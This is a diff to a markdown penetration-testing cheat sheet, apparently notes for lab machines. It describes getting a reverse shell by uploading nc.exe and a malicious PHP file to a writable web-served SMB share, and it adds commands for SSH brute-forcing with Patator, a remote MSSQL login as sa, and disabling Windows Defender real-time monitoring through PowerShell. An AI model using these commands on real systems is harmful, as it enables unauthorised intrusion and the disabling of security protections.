@@ -27,7 +27,6 @@ Connect without a password: `smbclient --no-pass -N //<IP>/Backups`
 `mount -t cifs //<IP>/Backups /mnt/remote -o rw`
 
 # SMBClient to shell
-
 If you are able to access a share you can write to and that share is for a website then you can get a shell by uploading `nc.exe` to the share as well as a malicious `php` file with the following code:
 
 ```php
@@ -35,3 +34,27 @@ If you are able to access a share you can write to and that share is for a websi
 ```
 
 Go to the website and navigate to the `php` file while you have a listener running
+
+# Run command as different user
+`sudo -u <username> 'command'`
+
+# Extract/open .img file
+`binwalk -e <.img FILE>`
+
+# Old SSH exchange key bruteforce
+For old linux distributions and boxes, bruteforcing SSH with hydra might not work because of the key exchange limitations
+
+You can use a tool called `Patator` with the following syntax
+
+- `patator ssh_login host=<IP> port =<PORT> user=<username> password=FILE0 0=<PASSWORD FILE> persistent=0`
+
+# Matching key exchange
+`ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss`
+
+# MSSQL
+login it to mssql remotely
+
+`sqsh -S <IP> -U sa -P <PASSWORD>`
+
+# Disable windefend if nt\authority
+`powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true -Verbose"`
